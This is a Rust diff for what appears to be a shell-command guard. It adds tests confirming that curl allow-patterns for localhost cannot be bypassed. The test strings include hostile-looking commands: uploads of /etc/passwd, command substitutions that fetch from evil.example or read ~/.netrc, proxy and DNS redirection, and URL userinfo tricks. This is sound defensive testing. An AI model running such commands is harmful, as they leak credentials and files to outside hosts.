@@ -157,6 +157,7 @@ impl<'a> CommandEvaluator<'a> {
         let parsed_flags_json = serde_json::to_value(&parsed_cmd.parsed_flags).ok();
         let positional_args_json = serde_json::to_value(&parsed_cmd.positional_args).ok();
         let positional_map_json = serde_json::to_value(parsed_cmd.positional_as_map()).ok();
+        let urls = command_parser::collect_urls(&parsed_cmd, &resolved.binary_name);
 
         // Check for python -c and analyze inline code
         let python_analysis =
@@ -187,6 +188,7 @@ impl<'a> CommandEvaluator<'a> {
             parsed_flags: parsed_flags_json,
             positional_args: positional_args_json,
             positional: positional_map_json,
+            urls,
             subcommand: parsed_cmd.subcommand,
             unknown_flags: parsed_cmd.unknown_flags,
             python_analysis,
@@ -368,6 +370,7 @@ impl<'a> CommandEvaluator<'a> {
 mod tests {
     use super::*;
     use crate::parser::parse_command;
+    use std::fs;
     use std::path::PathBuf;
     use tempfile::TempDir;
 
@@ -515,5 +518,481 @@ mod tests {
 
         // With no policies + Prompt mode, should return Ask (no rule matched)
         assert_eq!(result.decision(), Decision::Ask);
+    }
+
+    #[test]
+    fn test_allowed_curl_patterns_reject_extra_urls_and_indirection() {
+        let config_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("config");
+        let policy_dir = TempDir::new().unwrap();
+        let policy_path = policy_dir.path().join("localhost-curl.rego");
+        let second_policy_path = policy_dir.path().join("loopback-curl.rego");
+        fs::write(
+            &policy_path,
+            r#"
+package cmdguard
+
+import rego.v1
+
+allowed_curl_patterns contains `^http://localhost:3000($|/)`
+"#,
+        )
+        .unwrap();
+        fs::write(
+            &second_policy_path,
+            r#"
+package cmdguard
+
+import rego.v1
+
+allowed_curl_patterns contains `^http://127\.0\.0\.1:3000($|/)`
+"#,
+        )
+        .unwrap();
+
+        let mut engine = PolicyEngine::new();
+        engine.load_policies_with_layout(&config_dir).unwrap();
+        engine.load_policy_file(&policy_path).unwrap();
+        engine.load_policy_file(&second_policy_path).unwrap();
+
+        let mut nickel_config = NickelConfig::load(&config_dir);
+        let mut command_defs = CommandDefinitions::builtin();
+        command_defs.merge(nickel_config.get_command_definitions());
+
+        let cwd = "/tmp";
+        let cwd_path = PathBuf::from(cwd);
+        let context = create_test_context(cwd, &cwd_path);
+        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);
+
+        let cases = [
+            // --- allowed: plain requests to a pattern-matched URL ----------------
+            (
+                "cd /tmp && curl -s -X POST \\\n  http://localhost:3000/file_intents \\\n  -H 'Content-Type: application/json' \\\n  -d '{}' | jq -r '.error // \"declared\"'",
+                Decision::Allow,
+            ),
+            (
+                "curl --url http://localhost:3000/allowed",
+                Decision::Allow,
+            ),
+            ("curl http://127.0.0.1:3000/allowed", Decision::Allow),
+            ("curl -s http://localhost:3000/allowed", Decision::Allow),
+            ("curl -sS http://localhost:3000/allowed", Decision::Allow),
+            ("curl -d 'a=b' http://localhost:3000/allowed", Decision::Allow),
+            (
+                "curl -H 'X-Trace: y' http://localhost:3000/allowed",
+                Decision::Allow,
+            ),
+            (
+                "curl -F 'field=value' http://localhost:3000/allowed",
+                Decision::Allow,
+            ),
+            ("curl http://localhost:3000/allowed?a=b", Decision::Allow),
+            // A plain `$NAME` reference stays allowed: it is how secrets are
+            // kept out of the command line, and it cannot run a command.
+            (
+                "curl -H 'Authorization: Bearer $TOKEN' http://localhost:3000/allowed",
+                Decision::Allow,
+            ),
+            // --- URLs that no pattern covers --------------------------------------
+            (
+                "curl http://localhost:3000/allowed https://external.example",
+                Decision::Ask,
+            ),
+            (
+                "curl --url http://localhost:3000/allowed --next --url https://external.example",
+                Decision::Ask,
+            ),
+            (
+                "curl http://localhost:3000/allowed --url https://external.example",
+                Decision::Ask,
+            ),
+            (
+                "curl http://localhost:3000.evil.example/blocked",
+                Decision::Ask,
+            ),
+            // `--url` takes the next token verbatim, dashes included, so these
+            // request a target that never went through the pattern check.
+            (
+                "curl --url --next http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --url -external http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // --- destination indirection -------------------------------------------
+            (
+                "curl --config=/tmp/evil.curlrc http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -K/tmp/evil.curlrc http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --connect-to=localhost:3000:external.example:80 http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            ("curl -L http://localhost:3000/allowed", Decision::Ask),
+            (
+                "curl --socks5=evil.example:1080 http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --doh-url=https://evil.example/dns http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -x http://evil.example:8080 http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --resolve localhost:3000:203.0.113.1 http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // --- local files: writes ------------------------------------------------
+            (
+                "curl http://localhost:3000/allowed -o ~/.zshrc",
+                Decision::Ask,
+            ),
+            ("curl -O http://localhost:3000/allowed", Decision::Ask),
+            ("curl -OJ http://localhost:3000/allowed", Decision::Ask),
+            ("curl -sO http://localhost:3000/allowed", Decision::Ask),
+            (
+                "curl --output-dir=/home -O http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --remote-name-all http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -c/tmp/cookies http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -D/tmp/headers http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --cookie-jar=/tmp/jar http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --trace=/tmp/trace http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --dump-header=/tmp/head http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --stderr=/tmp/err http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --etag-save=/tmp/etag http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // --- local files: reads ---------------------------------------------------
+            (
+                "curl --upload-file=/etc/passwd http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --netrc-file=/tmp/netrc http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --cacert=/tmp/ca.pem http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -d @/etc/passwd http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -H @/etc/passwd http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --data-binary=@/etc/passwd http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --data-urlencode secret@/etc/passwd http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -F 'file=@/etc/passwd' http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -F 'field=</etc/passwd' http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // `--write-out` writes a local file itself: since curl 7.83 its
+            // format string takes `%output{file}` and `%output{>>file}`, and
+            // curl creates the file even when the transfer fails. The value is
+            // not worth parsing, so any `-w` blocks the allow.
+            (
+                "curl -w '%output{/tmp/pwn}%{http_code}' http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl --write-out '%output{>>/tmp/pwn}hi' http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // The trade-off: a plain format string asks too.
+            (
+                "curl -w '%{http_code}' http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // --- flags cmdguard does not model -----------------------------------------
+            (
+                "curl --frobnicate=1 http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -Zfrobnicate http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // --- environment prefixes and wrappers --------------------------------------
+            (
+                "http_proxy=http://evil.example curl http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "env http_proxy=http://evil.example curl http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "CURL_HOME=/tmp curl http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // --- tokens the shell or curl expands before the request --------------------
+            ("curl http://localhost:3000/$(id)", Decision::Ask),
+            ("curl http://localhost:3000/$X", Decision::Ask),
+            ("curl http://localhost:3000/{a,b}", Decision::Ask),
+            ("curl http://localhost:3000/[1-9].txt", Decision::Ask),
+            ("curl http://localhost:3000/*", Decision::Ask),
+            ("curl '`id`'", Decision::Ask),
+            // --- substitutions hidden in a quoted flag value ----------------------------
+            // The shell runs these before curl ever starts, so the URL check
+            // says nothing about what the command actually does.
+            (
+                "curl -H \"X: $(curl http://evil.example)\" http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -H \"X: `curl http://evil.example`\" http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -d \"$(cat /etc/passwd)\" http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -d \"$(< /etc/passwd)\" http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -X \"$(curl http://evil.example)\" http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -u \"$(cat ~/.netrc)\" http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            (
+                "curl -d \"${IFS}x\" http://localhost:3000/allowed",
+                Decision::Ask,
+            ),
+            // --- unrelated asks keep precedence ------------------------------------------
+            (
+                "curl http://localhost:3000/allowed > /tmp/curl-output",
+                Decision::Ask,
+            ),
+            ("curl -s -X POST", Decision::Ask),
+        ];
+
+        for (command, expected) in cases {
+            let parsed = parse_command(command);
+            assert!(!parsed.has_errors, "unexpected parse error for {command}");
+            let result = evaluator.resolve_compound(&parsed.commands, &context);
+            assert_eq!(result.decision, expected, "unexpected result for {command}");
+        }
+    }
+
+    #[test]
+    fn test_allowed_curl_patterns_match_the_canonical_url() {
+        let config_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("config");
+        let policy_dir = TempDir::new().unwrap();
+        let policy_path = policy_dir.path().join("localhost-curl.rego");
+        fs::write(
+            &policy_path,
+            r#"
+package cmdguard
+
+import rego.v1
+
+allowed_curl_patterns contains `^http://localhost:3000($|/)`
+"#,
+        )
+        .unwrap();
+
+        let mut engine = PolicyEngine::new();
+        engine.load_policies_with_layout(&config_dir).unwrap();
+        engine.load_policy_file(&policy_path).unwrap();
+
+        let mut nickel_config = NickelConfig::load(&config_dir);
+        let mut command_defs = CommandDefinitions::builtin();
+        command_defs.merge(nickel_config.get_command_definitions());
+
+        let cwd = "/tmp";
+        let cwd_path = PathBuf::from(cwd);
+        let context = create_test_context(cwd, &cwd_path);
+        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);
+
+        let cases = [
+            // --- spellings of the pattern's own destination ----------------------
+            // The pattern describes the canonical URL, so every way of writing
+            // the same request matches it: case, a padded port, dot segments, a
+            // fragment the server never sees, curl's guessed scheme, an empty
+            // path.
+            ("curl HTTP://LOCALHOST:3000/x", Decision::Allow),
+            ("curl http://localhost:03000/x", Decision::Allow),
+            ("curl 'http://localhost:3000/a/../x?q=1#f'", Decision::Allow),
+            ("curl localhost:3000/x", Decision::Allow),
+            ("curl http://localhost:3000", Decision::Allow),
+            // --- URLs that only look like the pattern's destination ---------------
+            // `localhost:3000` is a username and password here; the request
+            // goes to evil.com.
+            ("curl http://localhost:3000@evil.com/", Decision::Ask),
+            // `3000.evil.com` is not a port, so this is not a URL curl can
+            // fetch either.
+            ("curl http://localhost:3000.evil.com/x", Decision::Ask),
+            // The fragment is not sent, so it cannot make evil.com allowed.
+            (
+                "curl 'http://evil.com#http://localhost:3000/'",
+                Decision::Ask,
+            ),
+            // The same host as localhost usually is, but not the host the
+            // pattern names.
+            ("curl http://127.1:3000/x", Decision::Ask),
+            // --- URLs cmdguard refuses to canonicalize ----------------------------
+            (r"curl 'http://localhost:3000\@evil.com'", Decision::Ask),
+            ("curl ftp.localhost:3000/x", Decision::Ask),
+            ("curl file:///etc/passwd", Decision::Ask),
+            ("curl http://[::1]:3000/", Decision::Ask),
+            // --- every URL has to match, `--url` values included -------------------
+            (
+                "curl --url HTTP://LOCALHOST:3000/x --url http://evil.com/",
+                Decision::Ask,
+            ),
+        ];
+
+        for (command, expected) in cases {
+            let parsed = parse_command(command);
+            assert!(!parsed.has_errors, "unexpected parse error for {command}");
+            let result = evaluator.resolve_compound(&parsed.commands, &context);
+            assert_eq!(result.decision, expected, "unexpected result for {command}");
+        }
+    }
+
+    #[test]
+    fn test_allowed_curl_patterns_are_anchored_at_the_start() {
+        let config_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("config");
+        let policy_dir = TempDir::new().unwrap();
+        let policy_path = policy_dir.path().join("unanchored-curl.rego");
+        // Deliberately unanchored: `regex.match` searches anywhere in the
+        // string, so the policy has to anchor the pattern itself.
+        fs::write(
+            &policy_path,
+            r#"
+package cmdguard
+
+import rego.v1
+
+allowed_curl_patterns contains `http://localhost:3000`
+"#,
+        )
+        .unwrap();
+
+        let mut engine = PolicyEngine::new();
+        engine.load_policies_with_layout(&config_dir).unwrap();
+        engine.load_policy_file(&policy_path).unwrap();
+
+        let mut nickel_config = NickelConfig::load(&config_dir);
+        let mut command_defs = CommandDefinitions::builtin();
+        command_defs.merge(nickel_config.get_command_definitions());
+
+        let cwd = "/tmp";
+        let cwd_path = PathBuf::from(cwd);
+        let context = create_test_context(cwd, &cwd_path);
+        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);
+
+        let cases = [
+            // The pattern is live: it matches from the first character of the
+            // canonical URL, which is what a schemeless token becomes.
+            ("curl localhost:3000/allowed", Decision::Allow),
+            // ... and only from the first character: an unanchored pattern
+            // would otherwise match this request to evil.example.
+            (
+                "curl 'http://evil.example/?q=http://localhost:3000/'",
+                Decision::Ask,
+            ),
+        ];
+
+        for (command, expected) in cases {
+            let parsed = parse_command(command);
+            assert!(!parsed.has_errors, "unexpected parse error for {command}");
+            let result = evaluator.resolve_compound(&parsed.commands, &context);
+            assert_eq!(result.decision, expected, "unexpected result for {command}");
+        }
+    }
+
+    #[test]
+    fn test_empty_allowed_curl_pattern_allows_nothing() {
+        let config_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("config");
+        let policy_dir = TempDir::new().unwrap();
+        let policy_path = policy_dir.path().join("empty-curl.rego");
+        // An empty pattern anchors to `^(?:)`, which matches every string. A
+        // typo or an accidentally empty variable must not allow the internet.
+        fs::write(
+            &policy_path,
+            r#"
+package cmdguard
+
+import rego.v1
+
+allowed_curl_patterns contains ""
+"#,
+        )
+        .unwrap();
+
+        let mut engine = PolicyEngine::new();
+        engine.load_policies_with_layout(&config_dir).unwrap();
+        engine.load_policy_file(&policy_path).unwrap();
+
+        let mut nickel_config = NickelConfig::load(&config_dir);
+        let mut command_defs = CommandDefinitions::builtin();
+        command_defs.merge(nickel_config.get_command_definitions());
+
+        let cwd = "/tmp";
+        let cwd_path = PathBuf::from(cwd);
+        let context = create_test_context(cwd, &cwd_path);
+        let mut evaluator = CommandEvaluator::new(&mut engine, &command_defs, &mut nickel_config);
+
+        let cases = [
+            ("curl http://evil.example/x", Decision::Ask),
+            ("curl http://localhost:3000/allowed", Decision::Ask),
+        ];
+
+        for (command, expected) in cases {
+            let parsed = parse_command(command);
+            assert!(!parsed.has_errors, "unexpected parse error for {command}");
+            let result = evaluator.resolve_compound(&parsed.commands, &context);
+            assert_eq!(result.decision, expected, "unexpected result for {command}");
+        }
     }
 }
